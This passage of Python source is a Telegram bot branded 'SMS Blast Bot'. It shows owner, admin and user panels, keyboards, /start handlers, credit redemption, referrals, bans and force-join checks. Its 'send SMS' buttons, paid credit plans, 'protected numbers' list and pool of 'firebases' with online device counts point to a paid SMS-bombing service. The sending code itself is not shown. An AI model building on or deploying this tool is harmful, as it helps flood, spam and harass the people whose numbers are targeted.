    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    fj = d.get("force_join", {})
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    videos = d.get("videos", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ ʀᴇǫᴜɪʀᴇᴅ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()

    fb_lines = []
    fb_items = list(FB_DEVICE_COUNTS.items())
    shown_count = 0
    max_display = 5
    for fb_id, fb_data in fb_items:
        if shown_count >= max_display:
            remaining = len(fb_items) - max_display
            fb_lines.append(f"  {em(EMOJI_STAR, '➕')} +{remaining} more firebase(s)...")
            break
        age = int(time.time() - fb_data.get("last_update", 0))
        status = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        fb_lines.append(f"  {status} {fb_data['label'][:20]}: {fb_data['online']} ᴏɴʟɪɴᴇ")
        shown_count += 1
    fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

    protected_count = len(PROTECTED_NUMBERS)

    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(videos)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{protected_count}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{fb_summary}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    dev_tag = "<a href='https://t.me/flirts_x'>ㅤ⏤͟͟͞͞𝗙ʟɪʀᴛ𝗫ᴏ</a>"
    loop_row = em("5465270065102334742", "➿") * 14
    return (
        f"<blockquote>"
        f"{dev_tag}:\n"
        f"{loop_row}{em('6239930832128056797', '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"Owner: {SUPER_ADMIN_NAME}\n\n"
        f"{em('6125230925874731296', '➡️')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em('6104820463895057992', '🔗')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em('6107130683853903534', '🤝')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em('6120470070591230163', '🌟')} ᴀᴘɪs    : <b>{len(fbs)}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em('5339264095528970303', '🖕')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em('5359664288241829619', '🚀')}\n"
        f"ᴅᴇᴠᴇʟᴏᴘᴇ ʙʏ {dev_tag} {em('5276367933021391925', '🥰')}"
        f"</blockquote>"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑"), btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥"), btn("ᴜsᴇʀ ʟᴏᴏᴋᴜᴘ", "v5:lookup", EMOJI_STAR, "🔎")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1], style="danger" if d.get("free_mode") else "success")],
        [btn("ʟɪᴠᴇ ᴍᴏɴɪᴛᴏʀ", "v51:monitor", EMOJI_GEAR, "📡", style="success"), btn("sᴇʀᴠᴇʀ / sʏsᴛᴇᴍ", "v51:system", EMOJI_GEAR, "🖥", style="primary")],
        [btn("sᴛᴏʀᴀɢᴇ", "v51:storage", EMOJI_GEAR, "💽"), btn("ʙᴀᴄᴋᴜᴘ ᴍᴀɴᴀɢᴇʀ", "v51:backups", EMOJI_CHECK, "📦", style="success")],
        [btn("ᴇʀʀᴏʀ ʟᴏɢs", "v51:errors", EMOJI_WARNING, "🧯", style="danger"), btn("ғɪʀᴇʙᴀsᴇ ᴍᴏɴɪᴛᴏʀ", "v51:firebase", EMOJI_FIRE, "🔥")],
        [btn("ᴅᴀɪʟʏ sᴇᴀʀᴄʜᴇs", "v51:dailysearch", EMOJI_STAR, "🔍"), btn("ᴜsᴇʀ ʀᴇᴄᴏʀᴅs", "v5:lookup", EMOJI_STAR, "🗂")],
        [btn("ᴄʟᴏɴᴇ ᴍᴀɴᴀɢᴇʀ", "v51:clone", EMOJI_SHIELD, "👥", style="primary"), btn("ᴡᴇʟᴄᴏᴍᴇ sᴛᴜᴅɪᴏ", "v51:studio", EMOJI_VIDEO, "🎬")],
        [btn("sᴜᴘᴘᴏʀᴛ ɪɴʙᴏx", "v5:tickets", EMOJI_BELL, "🎫")],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄", style="success")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary")],
        [btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary"), btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger")],
        [btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ᴜsᴇʀ ʟᴏᴏᴋᴜᴘ / ʀᴇᴄᴏʀᴅs", "v5:lookup", EMOJI_STAR, "🗂", style="primary"), btn("ᴀɴᴀʟʏᴛɪᴄs", "v5:analytics", EMOJI_GEAR, "📈", style="primary")],
        [btn("ʟɪᴠᴇ ᴍᴏɴɪᴛᴏʀ", "v51:monitor", EMOJI_GEAR, "📡", style="success"), btn("sᴇʀᴠᴇʀ / sʏsᴛᴇᴍ", "v51:system", EMOJI_GEAR, "🖥")],
        [btn("sᴛᴏʀᴀɢᴇ", "v51:storage", EMOJI_GEAR, "💽"), btn("ᴇʀʀᴏʀ ʟᴏɢs", "v51:errors", EMOJI_WARNING, "🧯", style="danger")],
        [btn("ғɪʀᴇʙᴀsᴇ ᴍᴏɴɪᴛᴏʀ", "v51:firebase", EMOJI_FIRE, "🔥"), btn("ᴅᴀɪʟʏ sᴇᴀʀᴄʜᴇs", "v51:dailysearch", EMOJI_STAR, "🔍")],
        [btn("sᴜᴘᴘᴏʀᴛ ɪɴʙᴏx", "v5:tickets", EMOJI_BELL, "🎫", style="primary")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="success")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", "6203911118964924015", "📤", style="success")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", "5326049357332513437", "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", "6197500339109763704", "🎁", style="primary"), btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary")],
        [btn("sᴛᴀᴛs", "user:stats", "6104690120227559861", "📊", style="primary"), btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", "5231264265242954153", "📜", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", "6120628756747919945", "💰", style="success")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", "6120713655366455614", "💸", style="primary")],
        [btn("ɪɴғᴏ", "user:info", "5359454053887670307", "ℹ️", style="primary")],
        [btn("sᴜᴘᴘᴏʀᴛ ᴛɪᴄᴋᴇᴛ", "v5:support", EMOJI_BELL, "🎫", style="primary")],
        [btn("ᴍʏ ᴛɪᴄᴋᴇᴛs", "v5:mytickets", EMOJI_GEAR, "📨", style="primary")],
        [btn("ʜᴇʟᴘ / ɢᴜɪᴅᴇ", "v51:help", EMOJI_BELL, "❔", style="primary")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴍᴇᴅɪᴀ (ᴘʜᴏᴛᴏ/ᴠɪᴅᴇᴏ)", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴍᴇᴅɪᴀ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, item in enumerate(videos, 1):
        if isinstance(item, dict):
            m_type = item.get("type", "video")
            spoiler = item.get("spoiler", False)
        else:
            m_type = "video"
            spoiler = False
        icon = "🖼" if m_type == "photo" else "📹"
        spoiler_tag = " 🙈" if spoiler else ""
        label = f"{icon} #{idx}{spoiler_tag}"
        rows.append([btn(label, "noop", EMOJI_VIDEO, icon), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])
    
    nav_row = []
    if page > 0:
        nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    if page < total_pages - 1:
        nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"

    def _reg(d):
        return reg_user(uid, name, d)

    is_new = atomic_update(_reg)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    redeem_notice = ""
    if code.startswith("RDM"):
        redeem_code = code[3:]
        status, credits = do_redeem_code(uid, redeem_code)
        if status == "ok":
            redeem_notice = f"\n\n{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b> +{credits} credits added!"
        elif status == "expired":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Ye redeem code expire ho gaya hai!"
        elif status == "used":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!"
        elif status == "invalid":
            redeem_notice = f"\n\n{em(EMOJI_CROSS, '❌')} Invalid redeem code!"

    if code.startswith("REF"):
        d = load()
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass

    d = load()  # final fresh read — reflects reg_user + redeem + referral, all applied atomically above

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if redeem_notice:
        await msg.answer(redeem_notice.strip(), parse_mode="HTML")

    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein. Sahilxalone.t.me ", parse_mode="HTML")
        return

    await v51_send_welcome(msg.bot, msg.chat.id, d)
    if is_owner(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, owner_panel_text(d), owner_kb(d))
    elif is_admin(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, admin_panel_text(d), admin_kb(d))
    else:
        await send_media_with_caption(msg.bot, msg.chat.id, d, user_home_text(uid, d), user_kb())

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>\nAdmin se contact karein.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner se approval lein.", parse_mode="HTML")
        return

    await v51_send_welcome(msg.bot, msg.chat.id, d)
    if is_owner(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, owner_panel_text(d), owner_kb(d))
    elif is_admin(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d, admin_panel_text(d), admin_kb(d))
    else:
        await send_media_with_caption(msg.bot, msg.chat.id, d, user_home_text(uid, d), user_kb())

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try:
            await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return

    await cq.answer("✅ Verified!", show_alert=True)

    if is_owner(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, owner_panel_text(d), owner_kb(d))
    elif is_admin(uid, d):
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, admin_panel_text(d), admin_kb(d))
    else:
        await send_media_with_caption(cq.bot, cq.message.chat.id, d, user_home_text(uid, d), user_kb())

@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory hai!", show_alert=True)
        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
